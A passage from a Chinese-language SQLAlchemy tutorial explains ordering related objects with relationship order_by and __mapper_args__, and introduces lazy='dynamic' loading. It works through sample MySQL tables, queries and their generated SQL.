class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,当子对象和父对象取消关联时,子对象被标记为删除.</p></blockquote><h3 id="14-relationship中使用order-by-排序"><a href="#14-relationship中使用order-by-排序" class="headerlink" title="14.relationship中使用order_by 排序"></a>14.<code>relationship</code>中使用<code>order_by</code> 排序</h3><blockquote><p>就像前面介绍的可以使用<a href="./10030.md#%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E8%A1%A8(%E5%A4%9A%E4%B8%AA%E5%AE%9E%E4%BE%8B)%E4%BB%A5%E5%8F%8A%E6%A0%87%E9%87%8F(%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B)"><code>oder_by()</code> </a>对返回的对象进行排序操作.<code>SQLAlchemy</code> 也提供了一些简化排序的方法,比如</p><ul><li>在定义两张表的关系模式的时候指定他们排序方式,<ul><li>指定<code>relationship</code>中<code>order_by</code>的参数,它指定的类的属性,并可以添加<code>desc()</code>和<code>asc()</code>方法,</li><li>如<code>order_by=&#39;Products.create_time.desc()&#39;</code></li></ul></li><li>定义一张表的时候指定它的排序模式<ul><li>指定类的反向映射<code>__mapper_args__({ })</code> ,里面包含的是一个字典对象.</li></ul></li><li>排序方式<ul><li><code>asc</code>:升序</li><li><code>desc</code>:降序</li></ul></li></ul><p>有如下表</p><ul><li><code>categoryes</code>类别表,一个类有多个产品</li><li><code>products</code>产品表,一个产品属于多个类别</li><li><code>statistics</code>与上面两张表无关,是用来统计数据库中信息的</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span>Integer<span class="token punctuation">,</span>Text<span class="token punctuation">,</span>DECIMAL<span class="token punctuation">,</span>String<span class="token punctuation">,</span>ForeignKey<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> relationship<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> DateTime<span class="token comment" spellcheck="true"># 1.创建连接</span>connect_msg <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101/sqlalchemy'</span>engine<span class="token operator">=</span>create_engine<span class="token punctuation">(</span>connect_msg<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化 Session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建<code>Model</code>,类和表的对应</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Categoryes</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'categoryes_1'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    __mapper_args__ <span class="token operator">=</span>  <span class="token punctuation">{</span>        <span class="token string">'order_by'</span><span class="token punctuation">:</span> create_time<span class="token punctuation">.</span>desc<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># 在relationship 上指定排序方式, </span>    <span class="token comment" spellcheck="true"># 这里指定的 类的属性</span>    products <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Products'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'category'</span><span class="token punctuation">,</span> order_by<span class="token operator">=</span><span class="token string">'Products.create_time.desc()'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Products</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'products_1'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'categoryes_1.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 这个relationship 上不用指定排序,因为一个产品只属于一个类别,排序没有意义</span>    category<span class="token operator">=</span>relationship<span class="token punctuation">(</span><span class="token string">'Categoryes'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'products'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Statistics</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'statistics_1'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 正常排序方式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 创建表</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>drop_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span>Base<span class="token punctuation">.</span>metadata<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span>engine<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>给表中添加数据</p><pre class="line-numbers language-python"><code class="language-python">c1 <span class="token operator">=</span> Categoryes<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Book'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-20 11:21:30'</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> Products<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Java'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-21 11:21:30'</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> Products<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Python'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-22 11:21:30'</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>c1<span class="token punctuation">.</span>products<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>c1<span class="token punctuation">.</span>products<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c1<span class="token punctuation">)</span>c2 <span class="token operator">=</span> Categoryes<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'Fruit'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-23 11:21:30'</span><span class="token punctuation">)</span>p3 <span class="token operator">=</span> Products<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Apple'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-24 11:21:30'</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>p4 <span class="token operator">=</span> Products<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Banana'</span><span class="token punctuation">,</span>create_time<span class="token operator">=</span><span class="token string">'2013-10-25 11:21:30'</span><span class="token punctuation">,</span>c_id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>c2<span class="token punctuation">.</span>products<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p3<span class="token punctuation">)</span>c2<span class="token punctuation">.</span>products<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p4<span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>c2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> Statistics<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'categoryes表'</span><span class="token punctuation">,</span> create_time<span class="token operator">=</span><span class="token string">'2013-9-20 11:21:30'</span><span class="token punctuation">)</span>s2 <span class="token operator">=</span> Statistics<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'products表'</span><span class="token punctuation">,</span> create_time<span class="token operator">=</span><span class="token string">'2013-9-19 11:21:30'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>add_all<span class="token punctuation">(</span><span class="token punctuation">[</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">]</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code>数据库</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:test> select * from categoryes_1;                                                                                                                                                           +----+-------+---------------------+| id | name  | create_time         |+----+-------+---------------------+| 1  | Book  | 2013-10-20 11:21:30 || 2  | Fruit | 2013-10-23 11:21:30 |+----+-------+---------------------+2 rows in setTime: 0.015smysql root@192.168.101:test> select * from products_1;                                                                                                                                                             +----+--------+---------------------+------+| id | name   | create_time         | c_id |+----+--------+---------------------+------+| 1  | Java   | 2013-10-21 11:21:30 | 1    || 2  | Python | 2013-10-22 11:21:30 | 1    || 3  | Apple  | 2013-10-24 11:21:30 | 2    || 4  | Banana | 2013-10-25 11:21:30 | 2    |+----+--------+---------------------+------+4 rows in setTime: 0.019smysql root@192.168.101:test> select * from statistics_1;                                                                                                                                                           +----+--------------+---------------------+| id | name         | create_time         |+----+--------------+---------------------+| 1  | categoryes表 | 2013-09-20 11:21:30 || 2  | products表   | 2013-09-19 11:21:30 |+----+--------------+---------------------+2 rows in setTime: 0.034s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对默认创建的表<code>statistics_1</code> 执行查询</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 执行查询语句</span><span class="token comment" spellcheck="true"># 查询 statistics_1 表,不使用 order_by</span>q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Statistics<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT statistics_1.id AS statistics_1_id, statistics_1.name AS statistics_1_name,statistics_1.create_time AS statistics_1_create_time FROM statistics_1"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>order_by()</code>方法查询</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 使用order_by 升序和降序查询</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Statistics<span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>Statistics<span class="token punctuation">.</span>create_time<span class="token punctuation">.</span>desc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>q3 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Statistics<span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>Statistics<span class="token punctuation">.</span>create_time<span class="token punctuation">.</span>asc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q3<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT statistics_1.id AS statistics_1_id, statistics_1.name AS statistics_1_name,statistics_1.create_time AS statistics_1_create_time FROM statistics_1 ORDER BY statistics_1.create_time DESCSELECT statistics_1.id AS statistics_1_id, statistics_1.name AS statistics_1_name,statistics_1.create_time AS statistics_1_create_time FROM statistics_1 ORDER BY statistics_1.create_time ASC"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对表<code>categoryes_1</code>进行查询,它的<code>Model</code>中内置了排序方法</p><pre class="line-numbers language-python"><code class="language-python">q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Categoryes<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q4<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT categoryes_1.id AS categoryes_1_id, categoryes_1.name AS categoryes_1_name,categoryes_1.create_time AS categoryes_1_create_time FROM categoryes_1 ORDER BY categoryes_1.create_time DESC"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到,只是执行普通的查询语句,就执行了<code>order_by</code>命令,这是因为魔法方法<code>__mapper_args__</code>可以实现函数方法的反向映射.</p><p>对<code>categoryes_1</code>和<code>products_1</code>进行联表查询</p><pre class="line-numbers language-python"><code class="language-python">q5 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Categoryes<span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>Categoryes<span class="token punctuation">.</span>products<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q5<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT categoryes_1.id AS categoryes_1_id, categoryes_1.name AS categoryes_1_name,categoryes_1.create_time AS categoryes_1_create_time FROM categoryes_1 INNER JOIN products_1 ON categoryes_1.id = products_1.c_id ORDER BY categoryes_1.create_time DESC"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过一个分类去获取它下面的所有产品,并查看排序方式.</p><pre class="line-numbers language-python"><code class="language-python">q6 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>Categoryes<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 拿到一个类别下的所有的产品</span>q6<span class="token punctuation">.</span>products<span class="token keyword">for</span> i <span class="token keyword">in</span> q6<span class="token punctuation">.</span>products<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>id<span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""21    """</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过查看<code>mysql</code>的查询日志,可以看到在<code>relationship</code>中定义的排序方式确实生效了.</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">tail</span> -10 /mysql_data/localhost.log<span class="token string">''</span>'Query    SELECT products_1.id AS products_1_id, products_1.name AS products_1_name, products_1.create_time AS products_1_create_time, products_1.c_id AS products_1_c_id FROM products_1 WHERE 1 <span class="token operator">=</span> products_1.c_id ORDER BY products_1.create_time DESC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="15-relationship中惰性查询"><a href="#15-relationship中惰性查询" class="headerlink" title="15.relationship中惰性查询"></a>15.<code>relationship</code>中惰性查询</h3><h4 id="1-试理解relationship"><a href="#1-试理解relationship" class="headerlink" title="1.试理解relationship"></a>1.试理解<code>relationship</code></h4><blockquote><p><code>MySQL</code> 是一个关系型数据库,关系型数据库最关键的就是关系.<code>SQLAlchemy</code> 作为一层<code>ORM</code> 对象关系映射,它是通过<code>Model</code> 的属性来模拟关系的.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10205.png" alt="10206"></p><p>对于他们的映射</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10206.png" alt="10206"></p><p>大致被映射成了如上关系.</p><p>表与表之间的关系,直接映射成了<code>Class</code> 的一个<code>relationship()</code> 属性.表中字段之间的关系直接映射成一个一个<code>class</code> 类实例与另外 一个<code>class</code> 类实例之间的关系.</p><p>比如如下最简单的一对多的关系:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'parent_1'</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    p_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    child <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Child_1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'parent'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'Child_1'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'parent_1.p_id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parent<span class="token operator">=</span>relationship<span class="token punctuation">(</span><span class="token string">'Parent2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'child'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么<code>Parent_1</code> 的实例<code>p1</code>,就和多个<code>Child_1</code> 的实例产生了关系(通过外键),比如<code>c1,c2</code>.这样就完成了关系的抽象,也就是实现了面向对象的考虑.通过访问<code>p1.child</code> 就能访问到<code>c1,c2</code>,这样从<code>ORM</code>的角度简化了<code>SQL</code>语句的查询.</p><p>虽然底层实现的是<code>SQL</code> 语句.但是我们只用考虑面向对象层面就行.</p><p>这样又产生了新的问题,当访问<code>p1.children</code> 时,会拿到所有的在<code>Child2</code> 类中对应的实例.如果数据量过多,会非常消耗资源(比如内存吃紧),有时候,只想去拿到<code>p1.children</code> 对应的个别实例.这样就需要对<code>Parent1.children</code> 这个给属性做出控制.</p><p><code>Paren1.children</code> 是一个<code>relationship()</code> 对象,也就是对<code>relationship()</code>做出控制.</p><p>从<code>SQL</code>关系的角度看,这样就产生了惰性查询,也就是不返回所有的实例,而是返回一个<code>Query</code> 对象,让父类的属性再次操作<code>Query</code> 对象</p></blockquote><h4 id="2-简单验证lazy-dynamic"><a href="#2-简单验证lazy-dynamic" class="headerlink" title="2.简单验证lazy=dynamic"></a>2.简单验证<code>lazy=dynamic</code></h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">lazy 决定了 SQLAlchemy 什么时候从数据库中加载数据:，有如下四个值:<span class="token punctuation">(</span>其实还有个noload不常用<span class="token punctuation">)</span>select: <span class="token punctuation">(</span>which is the default<span class="token punctuation">)</span> means that SQLAlchemy will load the data as necessary <span class="token keyword">in</span> one go using a standard <span class="token keyword">select</span> statement. joined: tells SQLAlchemy to load the relationship <span class="token keyword">in</span> the same query as the parent using a JOIN statement. subquery: works like ‘joined’ but instead SQLAlchemy will use a subquery. dynamic <span class="token keyword">:</span> is special and useful <span class="token keyword">if</span> you have many items. Instead of loading the items SQLAlchemy will <span class="token keyword">return</span> another query object <span class="token function">which</span> you can further refine before loading the items. This is usually what you want <span class="token keyword">if</span> you <span class="token function">expect</span> <span class="token function">more</span> than a handful of items <span class="token keyword">for</span> this relationship<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>select</code>:默认值, 后台会用<code>select</code>语句一次性加载所有数据,即访问到属性的时候,就会全部加载该属性的数据.</li><li><code>joined</code>:数据会被JOIN语句加载,即对关联的两个表进行<code>join</code>操作,从而获取到所有相关的对象.</li><li><code>dynamic</code>:在访问属性的时候,并不在内存中加载数据,而是返回一个<code>AppenderQuery</code> 类对象,这个类继承自<code>Query</code> ,也就是会返回一个<code>Query</code> 对象.</li><li><code>subquery</code>: 数据被用<code>subquery子</code>查询SQL语句加载</li><li><code>True</code> :即<code>select</code>方法</li><li><code>False</code>:即<code>joined</code>方法</li></ul><p>现在来看一下一对多关系中的懒加载,首先一对多关系,说明父表的实例对象上关联了多个子表的实例对象.所以,一般会在父表上设置<code>lazy=&#39;dynamic&#39;</code>, 而不是子表.</p><p>设置如下关系的父表和子表</p><ul><li>父表:<code>User</code>,文章的作者,一个作者可以写多篇文章</li><li>子表:<code>Article</code>,文章表,一个文章只能对应一个作者,它有一个外键连接在父表上<code>u_id</code></li></ul><hr><p>创建如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token comment" spellcheck="true"># 一对多关系表,默认的加载方式时 lazy= select</span><span class="token keyword">class</span> <span class="token class-name">User_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user_2'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    articles <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Article_1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Article_1</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'article_2'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token operator">=</span> Column<span class="token punctuation">(</span>DateTime<span class="token punctuation">)</span>    u_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> ForeignKey<span class="token punctuation">(</span><span class="token string">'user_2.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    user <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'User_1'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'articles'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加 懒加载</span><span class="token keyword">class</span> <span class="token class-name">User_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user_3'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    articles <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Article_2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">,</span> lazy <span class="token operator">=</span> <span class="token string">'dynamic'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Article_2</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'article_3'</span>    id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create_time <span class="token 